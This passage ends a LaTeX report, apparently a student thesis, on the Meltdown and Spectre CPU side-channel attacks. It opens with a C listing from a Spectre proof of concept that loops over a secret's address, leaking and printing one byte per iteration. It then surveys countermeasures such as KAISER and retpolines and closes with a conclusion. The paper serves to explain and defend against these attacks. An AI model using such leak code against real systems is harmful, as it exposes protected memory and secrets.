Despite the same implementation could be applied in this scenario.
\texttt{value} contains the actual secret byte which is revealed by one iteration of the attack.
The whole process is repeated till all secret bytes are read indicated by \texttt{len}, i.e. the length of the secret byte array.

\begin{lstlisting}[language=C, caption=Spectre: Reading Secret Bytes, label={lst:spectreReadingSecretBytes}]
while (--len >= 0)
{
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
        printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
}
\end{lstlisting}

%%%
\chapter{Countermeasures}
\label{ch:countermeasures}
%%%

This chapter deals with a short overview of countermeasures mitigating Meltdown and Spectre. 
Although the fundamental design of modern processors enables the exploits there are still techniques to impede
the attacks.

\section{Meltdown}
\label{ch:intro:motivation}

Because the Meltdown exploit is based on fundamental CPU design issues it requires radical changes regarding instruction execution.
One option to prevent Meltdown is to disable out-of-order execution which would result in a massive slow-down of CPU performance.
Another way is to prevent the race condition between errors and illegal memory fetches. This is possible by serializing instructions
which check the access permission and those accessing memory.
A third option is to separate the user address space and the kernel address space so that illegal memory access is immediately
identified by hardware without table lookups, e.g. with the help of the virtual address.
The latter option is regarded as the most adequate because it could be realized with acceptable performance losses.
Meltdown is a hardware based exploit so that software patches do not solve all related problems. 
Still there is one software patch which impedes the exploit called \textit{KAISER} ~\cite{gruss2017kaslr}.

\subsection{KAISER}
\label{ch:intro:motivation}

Meltdown allows to read protected memory from kernel address space because it is mapped in the user address space.
KAISER is a software patch which separates kernel from user address space and introduces a so called \textit{shadow address space}
to isolate kernel memory. 
The shadow address space just contains the user address space and thus is completely isolated from the kernel address space.
Adding to this a process has a second address space where the kernel address space is still mapped into 
but it is reduced to the required minimum so that the attack surface is much smaller. 
Here the user address space is protected by supervisor-mode access prevention (SMAP) 
and supervisor-mode execution prevention (SMEP).

\section{Spectre}
\label{ch:intro:motivation}

The problems emerging due to the design issues of modern processors make it difficult to prevent Meltdown and Spectre 
as well without performance degradations.
One option to mitigate Spectre is to disable speculative execution. 
Modern processors do not support modes for disabling speculative execution. 
Moreover the performance of processors would be affected severely.
A second option is to prevent that secret data can be accessed by speculatively executed instructions. 
This can be done by protecting access to pointers with the help of type checks 
so that the access through a pointer to another type is prevented.
Another option is to identify memory which is accessed by speculative instructions and to prevent that subsequent
instructions can reveal it.
Besides cache attacks like Flush+Reload can be impeded by reducing the precision of time-stamp counters as already mentioned.
The last option is to mitigate indirect branch poisoning which enables manipulation of the branch predictor in other contexts.
This can be done by software patches like \textit{retpolines} ~\cite{retpoline}.
%%%
\chapter{Conclusion}
\label{ch:conclusion}
%%%

This work presented Meltdown and Spectre with a detailed comparison and example implementations to give 
an overview of the attacks and their implications.
They require a deep technical insight because a program written in a high-level language can be utilized 
to reveal secret data from low-level parts of the processor, i.e. the cache.
The different characteristics of Meltdown and Spectre are important to understand their practical impact
and prevention techniques.
Meltdown is a general purpose attack on Intel processors enabling privilege escalation while Spectre 
works on many processors (e.g. Intel, AMD, ARM) but has to be adapted to victim code and just reveals secret data of user processes.
The exploits demonstrate how the leakage of small traces within a processor leads to powerful side-channel attacks
which threaten the modern world of computing. 
Meltdown and Spectre introduce a new chapter in the world of side-channel attacks affecting mobile phones, laptops, browsers and 
many other areas like cloud computing.
Both attacks highlight the urgency for overthinking current processor designs and demonstrate that there is a tradeoff between
fast and secure processors.
Even though there are software solutions like KAISER or retpolines to impede some issues, 
hardware solutions are inevitable for long-term security of future processors.

\lstlistoflistings

\bibliography{literature}
\bibliographystyle{alpha}

\end{document}
